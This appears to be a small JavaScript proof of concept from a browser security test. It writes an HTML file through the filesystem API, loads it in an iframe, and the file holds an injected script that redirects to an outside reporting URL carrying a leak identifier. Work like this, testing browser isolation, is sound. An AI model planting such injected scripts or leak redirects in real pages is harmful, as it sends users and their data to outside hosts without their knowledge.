'use strict';

window.requestFileSystem = window.requestFileSystem || window.webkitRequestFileSystem;
function onInitFs(fs) {

  fs.root.getFile('test.html', { create: true }, function (fileEntry) {

    fileEntry.createWriter(function (fileWriter) {
      var attackerControlledString = "<script>document.location.href='https://adition.com/report/?leak=c916326'<\/script>";
      var blob = new Blob([attackerControlledString], { type: 'text/html' });
      fileWriter.write(blob);
    }, errorHandler);

    var url = fileEntry.toURL();
    document.body.appendChild(document.createElement("iframe")).src = url;
  }, errorHandler);
}

function errorHandler(e) {
  console.log(e);
}

window.requestFileSystem(window.TEMPORARY, 1024, onInitFs, errorHandler);